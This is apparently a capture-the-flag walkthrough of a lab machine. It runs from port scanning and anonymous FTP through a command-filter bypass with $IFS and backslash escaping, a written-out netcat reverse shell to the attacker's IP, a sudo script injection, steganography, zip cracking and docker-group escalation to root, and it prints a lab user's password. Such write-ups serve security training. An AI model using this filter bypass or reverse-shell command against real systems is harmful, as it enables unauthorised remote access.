*By Praveen Kumar Sharma*

![[Pasted image 20240921201021.png]]

<hr>

For me IP of the machine is : **10.10.23.2**
Lets try pinging it 

![[Pasted image 20240921190157.png]]

Alright lets do some port scanning 

<hr>

### Port Scanning : 

#### All Port Scan 

```bash
rustscan -a 10.10.23.2 --ulimit 5000
```

![[Pasted image 20240921190407.png]]

>[!Open Ports]
>PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Lets run an aggressive scan on these 
#### Aggressive Scan :

```bash
nmap -sC -sV -A -T5 -n -Pn -p 21,22,80 10.10.23.2 -o aggressiveScan.txt
```

![[Pasted image 20240921190554.png]]

>[!Agressive Scan]
>PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.17.94.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Game Info
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Some FTP action here lets enumerate that real quick

<hr>

### FTP Enumeration :

Lets login with anonymous username 

```bash
ftp 10.10.23.2
```

![[Pasted image 20240921190710.png]]

Now lets see all the files here 

![[Pasted image 20240921190802.png]]

Now lets get this file on our system with the get command here

```bash
ftp> get note.txt
```

![[Pasted image 20240921190913.png]]

Now lets do some directory fuzzing next 

<hr>

### Directory Fuzzing : 

```bash
feroxbuster --url http://10.10.23.2 -w /usr/share/wordlists/dirb/common.txt -t 200 -d 1
```

![[Pasted image 20240921191059.png]]
![[Pasted image 20240921191147.png]]

>[!Directories]
>200      GET       14l       82w     4153c http://10.10.23.2/images/img-07_002.png
200      GET       13l       82w     4124c http://10.10.23.2/images/img-05_002.png
200      GET        6l       58w     2443c http://10.10.23.2/images/img-03_003.png
200      GET       15l       83w     4148c http://10.10.23.2/images/img-01_002.png
200      GET        9l       83w     3762c http://10.10.23.2/images/img-02.png
200      GET       49l       63w     1348c http://10.10.23.2/js/3dslider.js
200      GET        7l       67w     2681c http://10.10.23.2/images/img-01_004.png
200      GET       13l      104w     5452c http://10.10.23.2/images/logo.png
200      GET       71l      192w     1644c http://10.10.23.2/css/3dslider.css
200      GET        9l       74w     4151c http://10.10.23.2/images/img-06.png
200      GET       12l       82w     4018c http://10.10.23.2/images/img-04_003.png
200      GET        9l       89w     5372c http://10.10.23.2/images/footer-logo.png
200      GET        6l       60w     2598c http://10.10.23.2/images/img-04_002.png
200      GET       10l       71w     2700c http://10.10.23.2/images/img-05.png
200      GET      359l      891w    19868c http://10.10.23.2/team.html
200      GET      109l      443w    37068c http://10.10.23.2/images/img-1-4.jpg
200      GET      287l      704w     9025c http://10.10.23.2/js/custom.js
200      GET       45l      331w    28476c http://10.10.23.2/images/img-04.png
200      GET       42l      443w    25210c http://10.10.23.2/images/img-1-3.jpg
200      GET      123l      484w    39337c http://10.10.23.2/images/img-1-2.jpg
200      GET      544l     1411w    30279c http://10.10.23.2/blog.html
200      GET     2188l     4179w    37910c http://10.10.23.2/style.css
200      GET        4l       55w     2591c http://10.10.23.2/images/img-02_002.png
200      GET       12l       92w     4417c http://10.10.23.2/images/img-08.png
200      GET        6l       87w     3886c http://10.10.23.2/images/img-03_002.png
200      GET      117l      465w    36457c http://10.10.23.2/images/img-1-1.jpg
200      GET      307l      818w    18301c http://10.10.23.2/contact.html
200      GET     2031l     4527w    42478c http://10.10.23.2/css/custom.css
200      GET      338l     1094w    21339c http://10.10.23.2/about.html
200      GET       51l      319w    27394c http://10.10.23.2/images/img-03.png
200      GET      331l      961w    19718c http://10.10.23.2/news.html
200      GET      644l     1718w    35184c http://10.10.23.2/index.html
301      GET        9l       28w      306c http://10.10.23.2/css => http://10.10.23.2/css/
200      GET        6l     1429w   121200c http://10.10.23.2/css/bootstrap.min.css
301      GET        9l       28w      308c http://10.10.23.2/fonts => http://10.10.23.2/fonts/
200      GET     1137l     6409w   503342c http://10.10.23.2/images/match-banner1.jpg
200      GET      899l     4933w   375985c http://10.10.23.2/images/img-05.jpg
200      GET      841l     5737w   195294c http://10.10.23.2/images/loading-img.gif
301      GET        9l       28w      309c http://10.10.23.2/images => http://10.10.23.2/images/
301      GET        9l       28w      305c http://10.10.23.2/js => http://10.10.23.2/js/
200      GET      240l     3757w   285530c http://10.10.23.2/js/all.js
200      GET     2441l    12116w   971542c http://10.10.23.2/images/img-03_003.jpg
200      GET     2247l    12799w  1079277c http://10.10.23.2/images/img-07.jpg
200      GET      364l      832w     8925c http://10.10.23.2/css/responsive.css
301      GET        9l       28w      309c http://10.10.23.2/secret => http://10.10.23.2/secret/
200      GET        0l        0w   847924c http://10.10.23.2/images/img-01_002.jpg
200      GET        0l        0w  1235757c http://10.10.23.2/images/img-02_003.jpg
200      GET      644l     1718w    35184c http://10.10.23.2/

Now lets see web application now 

<hr>

### Web Application :

![[Pasted image 20240921191314.png]]

Nothing in the source code as well lets now see the /secret page that seems only the interesting one here 

![[Pasted image 20240921191413.png]]

Now lets try to run ls to see if we can find files here 

![[Pasted image 20240921191450.png]]

It did say that there is some filtering going on here 
Two ways i think we can break through this 
1. we can use the $IFS to add a space after the command 
2. We can use the escaping character \\ to get the command to execute 

Both of these work btw 

$IFS first 

![[Pasted image 20240921191721.png]]

and the \\ character now

![[Pasted image 20240921191801.png]]

Im gonna use the \\ one from here on out as for every space we have to add the $IFS and we only need to use only one escaping character here 

<hr>

### Gaining Access :

Now we can execute any command here 
bash revshell didnt work for me here

Lets run the netcat revshell to get a shell 

First start a listener

![[Pasted image 20240921192054.png]]

Now put in this to get a revshell here 

```bash
r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.94.2 9001 >/tmp/f
```

And we get our revshell here 

![[Pasted image 20240921192157.png]]

Lets upgrade this 

![[Pasted image 20240921192244.png]]

<hr>

### Lateral PrivEsc - 1 :

Lets see the sudo permissions here 

![[Pasted image 20240921192409.png]]

Lets see the content of this script here 

![[Pasted image 20240921192450.png]]

This should be easy to break as $msg is just a vulnerability here 

![[Pasted image 20240921192645.png]]

Lets make the shell a bit stable

![[Pasted image 20240921192816.png]]

Here is the local.txt 

![[Pasted image 20240921192917.png]]

Lets upgrade the shell a bit more lets add a ssh key in the authorized keys under .ssh

First make your own ssh keys 

![[Pasted image 20240921193034.png]]

Now lets just the content of apaar.pub in the authorized_keys under .ssh in apaar's home directory 

![[Pasted image 20240921193219.png]]

The above line is ugly as it got wrapped around but lets now get in with ssh now 

![[Pasted image 20240921193334.png]]

<hr>

### Lateral PrivEsc - 2 :

U can run linpeas to find it has mysql running it is a rabbit hole 
trust me 

Also found something running on 9001
so i found this folder under /var/www called files 

![[Pasted image 20240921193518.png]]

Now here im curios cuz html here is the site we are looking at but this is the one that is running on 9001 

Lets see what it has 

![[Pasted image 20240921193709.png]]

So the mysql password here its a rabbit hole trust me 

Lets see the hacker.php file here 

![[Pasted image 20240921193812.png]]

Now lets make a python server here so we can see what is going on here 

![[Pasted image 20240921193904.png]]

Lets see this page now 

![[Pasted image 20240921194006.png]]

Lets download this hacker-with laptop image using curl 

![[Pasted image 20240921194141.png]]

Lets run steghide against this

![[Pasted image 20240921194248.png]]

I didnt put any password in this btw just hit ENTER u should have your zip here 

Lets unzip this 

![[Pasted image 20240921194349.png]]

Ok so lets run zip2john and crack this using john 

![[Pasted image 20240921194506.png]]

Now lets unzip this 

![[Pasted image 20240921194643.png]]

Now lets see this 

![[Pasted image 20240921194719.png]]

Here is a password also look at the echo at the bottom of this image its a password for Anurodh

Lets decode this 

![[Pasted image 20240921194828.png]]

>[!User Creds]
>Username : anurodh
>Password : !d0ntKn0wmYp@ssw0rd

Lets login with SSH 

![[Pasted image 20240921195019.png]]

<hr>

### Vertical PrivEsc

So this should be pretty easy as if u look at the `id` command we are in the docker group

![[Pasted image 20240921195139.png]]

So docker only work with sudo command so docker is mapped is always mapped to be ran with sudo if its not explicit in the sudo permissions 

Lets find the trick on GTFObins

![[Pasted image 20240921195315.png]]

Lets run this to get root 

![[Pasted image 20240921195352.png]]

And here is your root.txt i.e. proof.txt in the machine 

![[Pasted image 20240921195451.png]]

Thanks for reading :)












